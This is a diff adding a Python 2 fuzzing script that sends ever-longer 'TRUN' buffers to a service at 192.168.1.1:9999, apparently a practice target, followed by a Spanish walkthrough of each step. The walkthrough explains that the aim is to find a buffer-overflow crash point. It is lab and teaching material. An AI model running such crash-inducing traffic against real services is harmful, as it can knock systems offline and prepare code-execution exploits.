@@ -1,0 +1,32 @@
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+	try: 
+		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect(('192.168.1.1', 9999))
+		s.send(('TRUN /.:/' + buffer))
+		s.close()
+		sleep(1)
+		buffer = buffer + "A"*100
+	except:
+		print "Fuzzing crashed at %s bytes" % str(len(buffer))
+		sys.exit()
+
+Este script es un script de fuzzing diseñado para encontrar vulnerabilidades de desbordamiento de búfer en un servicio que escucha en la dirección IP '192.168.1.1' en el puerto 9999. Aquí está lo que hace paso a paso:
+
+Importa los módulos necesarios: sys, socket y sleep.
+Define un búfer inicial de 100 bytes lleno de caracteres 'A'.
+Entra en un bucle infinito que intentará enviar un paquete al servicio objetivo.
+En cada iteración del bucle, crea un nuevo socket TCP utilizando socket.socket.
+Se conecta al servicio objetivo en la dirección IP '192.168.1.1' en el puerto 9999 utilizando s.connect().
+Envía un paquete al servicio objetivo utilizando s.send(). El paquete contiene una cadena 'TRUN /.:/' seguida del búfer actual.
+Cierra el socket utilizando s.close().
+Duerme durante 1 segundo antes de continuar a la siguiente iteración del bucle.
+Incrementa el tamaño del búfer en 100 bytes para la próxima iteración.
+El objetivo de este script es enviar gradualmente paquetes de datos cada vez más grandes al servicio objetivo para intentar provocar un desbordamiento de búfer. Cuando se produce un desbordamiento de búfer, el servicio puede volverse inestable o incluso bloquearse, lo que indica la presencia de una posible vulnerabilidad que podría ser explotada para realizar un ataque más serio, como la ejecución de código arbitrario.
+
+El script imprime un mensaje cuando el proceso de fuzzing se bloquea en cierta cantidad de bytes. Esto puede indicar que se ha encontrado un límite en el tamaño del búfer aceptado por el servicio, lo que puede ser útil para determinar el tamaño máximo del búfer antes de que ocurra un desbordamiento.
